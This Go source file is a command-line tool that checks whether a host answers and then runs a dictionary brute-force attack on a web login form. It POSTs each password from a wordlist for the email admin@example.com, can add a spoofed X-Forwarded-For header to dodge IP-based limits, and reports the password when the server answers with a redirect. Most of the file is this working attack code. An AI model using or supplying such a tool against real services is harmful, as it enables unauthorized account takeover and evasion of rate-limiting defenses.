package main

import (
	"fmt"
	"net/http"
	"os"
	"flag"
	"net/url"
	"bufio"
	"strings"
)

type Options struct {
	Host string
	Port int
	Uri  string
	From string
}

func ping(options *Options) {
	target := fmt.Sprintf("http://%s:%d", options.Host, options.Port)
	fmt.Printf("Pinging %s:%d ...", target)
	response, err := http.Get(target)

	if err != nil {
		fmt.Printf("%s\n", err)
		os.Exit(1)
	} else {
		defer response.Body.Close()
		fmt.Printf(" [%s]\n", response.Status)
	}
}

func loginAttack(options *Options) {
	target := fmt.Sprintf("http://%s:%d", options.Host, options.Port)
	endpoint := fmt.Sprintf("%s%s", target, options.Uri)
	fmt.Println("Starting login attack on", endpoint)

	file, err := os.Open("dictionary.txt")
	if err != nil {
		fmt.Println(err)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	for _, password := range lines {
		data := url.Values{}
		data.Set("inputEmail", "admin@example.com")
		data.Set("inputPassword", password)

		request, _ := http.NewRequest("POST", endpoint, strings.NewReader(data.Encode()))
		request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		if options.From != "" {
			request.Header.Add("X-Forwarded-For", options.From)
		}

		transport := http.Transport{}
		response, _ := transport.RoundTrip(request)
		defer response.Body.Close()

		if (response.StatusCode == 302) {
			fmt.Println("The password is:", password)
			os.Exit(0)
		}
	}
}

func main() {
	pingPtr := flag.Bool("ping", false, "Test to see if a host is available")
	hostPtr := flag.String("host", "", "Set the host")
	portPtr := flag.Int("port", 80, "Set the port")
	fromPtr := flag.String("from", "", "Set the X-Forwarded-For header")
	loginAttackPtr := flag.String("attack", "", "Hit the login endpoint of an application")

	flag.Parse()

	options := new(Options)

	if *hostPtr != "" {
		options.Host = *hostPtr
	}

	if *portPtr != 0 {
		options.Port = *portPtr
	}

	if *loginAttackPtr != "" {
		options.Uri = *loginAttackPtr
	}

	if *fromPtr != "" {
		options.From = *fromPtr
	}

	if (options.Host == "" && options.Port == 0) {
		fmt.Println("Must supply a host and port")
		os.Exit(1)
	}

	if (*pingPtr == true) {
		ping(options)
		os.Exit(0)
	}

	if (*loginAttackPtr != "") {
		loginAttack(options)
		os.Exit(0)
	}
}
